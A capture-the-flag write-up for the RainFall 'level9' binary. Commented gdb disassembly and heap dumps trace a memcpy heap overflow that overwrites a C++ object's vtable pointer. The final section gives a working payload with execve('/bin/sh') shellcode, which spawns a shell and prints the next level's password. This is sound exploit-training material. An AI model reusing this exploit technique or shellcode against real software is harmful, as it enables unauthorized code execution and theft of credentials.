# level9


```sh

level9@RainFall:~$ ltrace ./level9 arg1 arg2 arg3
__libc_start_main(0x80485f4, 4, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_Znwj(108, 0xbffff7d4, 0xbffff7e8, 0xb7d79e55, 0xb7fed280) = 0x804a008
_Znwj(108, 5, 0xbffff7e8, 0xb7d79e55, 0xb7fed280) = 0x804a078
strlen("arg1")                                   = 4
memcpy(0x0804a00c, "arg1", 4)                    = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++
```
 program takes av[1] and calculate the lenght then coppy it to 0x0804a00c with memcopy

### gdb

commented step by step 

```sh 
➜  ~ gdb ./level9 
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04.2) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.10
Reading symbols from ./level9...
(No debugging symbols found in ./level9)
(gdb)  disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp                # Save base pointer
   0x080485f5 <+1>:	mov    ebp,esp            # Set up new stack frame
   0x080485f7 <+3>:	push   ebx                # Save EBX register
   0x080485f8 <+4>:	and    esp,0xfffffff0     # Align stack to 16 bytes
   0x080485fb <+7>:	sub    esp,0x20           # Allocate 32 bytes stack space
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1  # Compare argc with 1
   0x08048602 <+14>:	jg     0x8048610 <main+28>      # Jump if argc > 1
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1      # Exit status = 1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>    # Exit if no arguments
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c    # Allocate 108 bytes (0x6c) \\First object allocation (N1)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>   # operator new(unsigned int)
   0x0804861c <+40>:	mov    ebx,eax                 # Store pointer in EBX
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5 # Second arg = 5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx     # First arg = pointer (*this)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>   # N::N(int) constructor
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx # Store N1 at esp+0x1c
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c    # Allocate another 108 bytes \\ Second object allocation (N2)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>   # operator new
   0x0804863e <+74>:	mov    ebx,eax                 # Store pointer
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6 # Second arg = 6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx     # First arg = pointer
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>   # N::N(int) constructor
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx # Store N2 at esp+0x18
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c] # Load N1
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax # Copy to esp+0x14
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18] # Load N2
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax # Copy to esp+0x10
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc] # Load argv
   0x08048667 <+115>:	add    eax,0x4                 # Get argv[1]
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]      # Dereference argv[1]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax  # Set as second arg
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14] # Load N1
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax      # Set as first arg
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> # N1.setAnnotation(argv[1])
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] # Load N2
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]       # Get vtable pointer
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]       # Get first vtable entry (operator+)
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14] # Load N1 as argument
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax  # Set as second arg
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10] # Load N2
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax      # Set as first arg
   0x08048693 <+159>:	call   edx                     # Call virtual function (N2.operator+(N1)) (vulnerability point)
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4] # Restore EBX
   0x08048698 <+164>:	leave                          # Restore stack frame
   0x08048699 <+165>:	ret                            # Return
End of assembler dump.
(gdb)  info function  
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()@plt
0x080484e0  __libc_start_main@plt
0x080484f0  _exit@plt
0x08048500  std::ios_base::Init::~Init()@plt
0x08048510  memcpy@plt
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*) 
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
(gdb)
(gdb) disas 0x0804870e
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp            # Allocate 24 bytes stack space
   0x08048714 <+6>:	mov    0xc(%ebp),%eax        # Load argument (char* input) => av[1]
   0x08048717 <+9>:	mov    %eax,(%esp)
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx
   0x08048722 <+20>:	add    $0x4,%edx             # Calculate destination address:
                                                   # this + 4 (skip vtable pointer)
   0x08048725 <+23>:	mov    %eax,0x8(%esp)        # 3rd arg: length (from strlen)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax        # Load input string again
   0x0804872c <+30>:	mov    %eax,0x4(%esp)        # 2nd arg: source string
   0x08048730 <+34>:	mov    %edx,(%esp)           # 1st arg: destination (this+4)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt> # Dangerous unbounded copy!

   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.

```
this is a base class constructed and and overide virtual function.

vtable manupilation the N1 is before the N2 and calling a non protected memcopy so we try to overide the N2 operator called 

```bash 
(gdb) break *0x08048677
Breakpoint 1 at 0x8048677
(gdb) break *0x08048738
Breakpoint 2 at 0x8048738
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /home/user/level9/level9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048677 in main ()
(gdb) info proc map
process 3618
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7cfa000 0xb7cfc000     0x2000        0x0 
	0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d46000 0xb7d47000     0x1000        0x0 
	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
(gdb) x/120wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x00000000 # 0x08048848 pointer to operator member function 
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000 # N1 localtion 
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000 # N2 location
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a100:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a110:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a120:	0x00000000	0x00000000	0x00000000	0x00000000

(gdb) x/wx 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a # N::operator+(N&)
(gdb) x/wx 0x0804873a
0x804873a <_ZN1NplERS_>:	0x8be58955
(gdb) continue
Continuing.

Breakpoint 2, 0x08048738 in N::setAnnotation(char*) ()
(gdb) x/120wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x41414141
0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x00414141
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
...
(gdb) x/s 0x08048848
0x8048848 <_ZTV1N+8>:	 ":\207\004\bN\207\004\b1N"
(gdb) x/wx 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) x/s 0x0804873a
0x804873a <_ZN1NplERS_>:	 "U\211\345\213E\b\213Ph\213E\f\213@h\001\320]ÐU\211\345\213E\b\213Ph\213E\f\213@h\211\321)\301\211\310]Ð\220\220\220\220\220\220\220\220\220\220UWVS\350i"
(gdb) x/wx 0x0804873a
0x804873a <_ZN1NplERS_>:	0x8be58955
(gdb) x/xx 0x0804873a
0x804873a <_ZN1NplERS_>:	0x8be58955
(gdb) x/s 0x08048848
0x8048848 <_ZTV1N+8>:	 ":\207\004\bN\207\004\b1N"
(gdb) x/wx 0x08048848
0x8048848 <_ZTV1N+8>:	0x0804873a
(gdb) continue
Continuing.
[Inferior 1 (process 3618) exited with code 013]
(gdb) break *0x08048693
Breakpoint 3 at 0x8048693
(gdb) run BBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /home/user/level9/level9 BBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 1, 0x08048677 in main ()
(gdb) x/120wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x00000000
0x804a010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
...
(gdb) x/s 0x08048848
0x8048848 <_ZTV1N+8>:	 ":\207\004\bN\207\004\b1N"
(gdb) continue
Continuing.

Breakpoint 2, 0x08048738 in N::setAnnotation(char*) ()
(gdb) continue
Continuing.

Breakpoint 3, 0x08048693 in main ()
(gdb) x/80wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x42424242
0x804a010:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a020:	0x42424242	0x00424242	0x00000000	0x00000000
0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a070:	0x00000005	0x00000071	0x08048848	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/s $edx
0x804873a <_ZN1NplERS_>:	 "U\211\345\213E\b\213Ph\213E\f\213@h\001\320]ÐU\211\345\213E\b\213Ph\213E\f\213@h\211\321)\301\211\310]Ð\220\220\220\220\220\220\220\220\220\220UWVS\350i"
(gdb) x/s 0x0804873a
0x804873a <_ZN1NplERS_>:	 "U\211\345\213E\b\213Ph\213E\f\213@h\001\320]ÐU\211\345\213E\b\213Ph\213E\f\213@h\211\321)\301\211\310]Ð\220\220\220\220\220\220\220\220\220\220UWVS\350i"
(gdb) 
```

### exploit 

```bash 
(gdb) break *0x0804868c
Breakpoint 1 at 0x804868c
(gdb) run  $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
Starting program: /home/user/level9/level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')

Breakpoint 1, 0x0804868c in main ()
(gdb) info proc map
process 3756
Mapped address spaces:memcpy

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7cfa000 0xb7cfc000     0x2000        0x0 
	0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d46000 0xb7d47000     0x1000        0x0 
	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eed000 0xb7ef0000     0x3000        0x0 
	0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fce000 0xb7fd5000     0x7000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) x/90wx 0x804a000
0x804a000:	0x00000000	0x00000071	0x08048848	0x0804a010
0x804a010:	0x6850c031	0x68732f2f	0x69622f68	0x89e3896e
0x804a020:	0xb0c289c1	0x3180cd0b	0x80cd40c0	0x41414141
0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a050:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a060:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a070:	0x41414141	0x41414141	0x0804a00c	0x00000000
0x804a080:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a090:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0e0:	0x00000006	0x00020f21	0x00000000	0x00000000
0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a100:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a110:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a120:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a130:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a140:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a150:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a160:	0x00000000	0x00000000
(gdb) x/wx 0x0804a00c
0x804a00c:	0x0804a010
(gdb) x/s $eax
0x804a008:	 "H\210\004\b\020\240\004\b1\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀", 'A' <repeats 76 times>, "\f\240\004\b"
(gdb) x/wx $eax
0x804a008:	0x08048848
(gdb) x/4wx $eax
0x804a008:	0x08048848	0x0804a010	0x6850c031	0x68732f2f
(gdb) x/4wx 0x0804a00c
0x804a00c:	0x0804a010	0x6850c031	0x68732f2f	0x69622f68
(gdb) continue
Continuing.
process 3756 is executing new program: /bin/dash
$ cat ../level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```
